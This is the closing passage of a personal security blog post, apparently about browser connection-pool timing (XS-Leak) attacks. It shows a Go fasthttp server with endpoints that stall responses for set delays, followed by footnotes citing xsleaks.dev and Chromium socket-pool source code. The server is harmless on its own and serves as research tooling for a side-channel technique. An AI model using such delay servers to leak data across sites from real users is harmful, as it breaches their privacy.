</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>fasthttp</span><span class=p>.</span><span class=nf>ListenAndServe</span><span class=p>(</span><span class=s>&#34;:80&#34;</span><span class=p>,</span> <span class=nx>requestHandler</span><span class=p>);</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nb>panic</span><span class=p>(</span><span class=s>&#34;Error in ListenAndServe: &#34;</span> <span class=o>+</span> <span class=nx>err</span><span class=p>.</span><span class=nf>Error</span><span class=p>())</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>requestHandler</span><span class=p>(</span><span class=nx>ctx</span> <span class=o>*</span><span class=nx>fasthttp</span><span class=p>.</span><span class=nx>RequestCtx</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>workerSemaphore</span> <span class=o>&lt;-</span> <span class=kd>struct</span><span class=p>{}{}</span>
</span></span><span class=line><span class=cl>	<span class=k>defer</span> <span class=kd>func</span><span class=p>()</span> <span class=p>{</span> <span class=o>&lt;-</span><span class=nx>workerSemaphore</span> <span class=p>}()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>path</span> <span class=o>:=</span> <span class=nb>string</span><span class=p>(</span><span class=nx>ctx</span><span class=p>.</span><span class=nf>Path</span><span class=p>())</span>
</span></span><span class=line><span class=cl>	<span class=k>switch</span> <span class=nx>path</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>case</span> <span class=s>&#34;/40sleep&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=nx>time</span><span class=p>.</span><span class=nf>Sleep</span><span class=p>(</span><span class=mi>40</span> <span class=o>*</span> <span class=nx>time</span><span class=p>.</span><span class=nx>Second</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>ctx</span><span class=p>.</span><span class=nf>SetStatusCode</span><span class=p>(</span><span class=nx>fasthttp</span><span class=p>.</span><span class=nx>StatusOK</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>case</span> <span class=s>&#34;/ssleep&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=nx>time</span><span class=p>.</span><span class=nf>Sleep</span><span class=p>(</span><span class=mi>250</span> <span class=o>*</span> <span class=nx>time</span><span class=p>.</span><span class=nx>Millisecond</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>ctx</span><span class=p>.</span><span class=nf>SetStatusCode</span><span class=p>(</span><span class=nx>fasthttp</span><span class=p>.</span><span class=nx>StatusOK</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>default</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=nx>path</span><span class=p>)</span> <span class=p>&gt;</span> <span class=mi>1</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nx>trimmed</span> <span class=o>:=</span> <span class=nx>strings</span><span class=p>.</span><span class=nf>TrimPrefix</span><span class=p>(</span><span class=nx>path</span><span class=p>,</span> <span class=s>&#34;/&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=nx>seconds</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>strconv</span><span class=p>.</span><span class=nf>Atoi</span><span class=p>(</span><span class=nx>trimmed</span><span class=p>);</span> <span class=nx>err</span> <span class=o>==</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=nx>time</span><span class=p>.</span><span class=nf>Sleep</span><span class=p>(</span><span class=nx>time</span><span class=p>.</span><span class=nf>Duration</span><span class=p>(</span><span class=nx>seconds</span><span class=p>)</span> <span class=o>*</span> <span class=nx>time</span><span class=p>.</span><span class=nx>Second</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=nx>ctx</span><span class=p>.</span><span class=nf>SetStatusCode</span><span class=p>(</span><span class=nx>fasthttp</span><span class=p>.</span><span class=nx>StatusOK</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=k>return</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=nx>ctx</span><span class=p>.</span><span class=nf>Error</span><span class=p>(</span><span class=s>&#34;Not Found&#34;</span><span class=p>,</span> <span class=nx>fasthttp</span><span class=p>.</span><span class=nx>StatusNotFound</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/>https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><a href=https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face/src#description>https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face/src#description</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3><p><a href="https://source.chromium.org/chromium/chromium/src/+/main:net/socket/transport_client_socket_pool.cc;l=217;drc=58fb75d86a0ad2642beec2d6c16b1e6c008e33cd?q=FindTopStalledGroup&amp;ss=chromium%2Fchromium%2Fsrc">https://source.chromium.org/chromium/chromium/src/+/main:net/socket/transport_client_socket_pool.cc;l=217;drc=58fb75d86a0ad2642beec2d6c16b1e6c008e33cd?q=FindTopStalledGroup&amp;ss=chromium%2Fchromium%2Fsrc</a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:4><p><a href="https://source.chromium.org/chromium/chromium/src/+/main:net/socket/transport_client_socket_pool.h;l=775;drc=58fb75d86a0ad2642beec2d6c16b1e6c008e33cd">https://source.chromium.org/chromium/chromium/src/+/main:net/socket/transport_client_socket_pool.h;l=775;drc=58fb75d86a0ad2642beec2d6c16b1e6c008e33cd</a>&#160;<a href=#fnref:4 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:5><p><a href="https://source.chromium.org/chromium/chromium/src/+/main:net/socket/client_socket_pool.h;l=99;drc=58fb75d86a0ad2642beec2d6c16b1e6c008e33cd">https://source.chromium.org/chromium/chromium/src/+/main:net/socket/client_socket_pool.h;l=99;drc=58fb75d86a0ad2642beec2d6c16b1e6c008e33cd</a>&#160;<a href=#fnref:5 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:6><p><a href="https://source.chromium.org/chromium/chromium/src/+/main:net/socket/client_socket_pool.h;l=139;drc=58fb75d86a0ad2642beec2d6c16b1e6c008e33cd">https://source.chromium.org/chromium/chromium/src/+/main:net/socket/client_socket_pool.h;l=139;drc=58fb75d86a0ad2642beec2d6c16b1e6c008e33cd</a>&#160;<a href=#fnref:6 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:7><p><a href=https://en.cppreference.com/w/cpp/container/map>https://en.cppreference.com/w/cpp/container/map</a>&#160;<a href=#fnref:7 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:8><p><a href="https://web.dev/articles/fetch-priority?hl=en#resource-priority">https://web.dev/articles/fetch-priority?hl=en#resource-priority</a>&#160;<a href=#fnref:8 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></div></article></main></div><footer><hr><p id=social>Find me around the web:<br><a href=https://github.com/salvatore-abello>Github</a>
|
<a href=https://www.linkedin.com/in/salvatore-abello-411b64252/>Linkedin</a>
|
<a href=https://x.com/salvatoreabello>X</a></p><p class=copyright>Copyright 2025. All rights reserved.<hr><code>Made with ‚ù§Ô∏è by <strong>Salvatore Abello</strong></code>.</p></footer></div></body></html>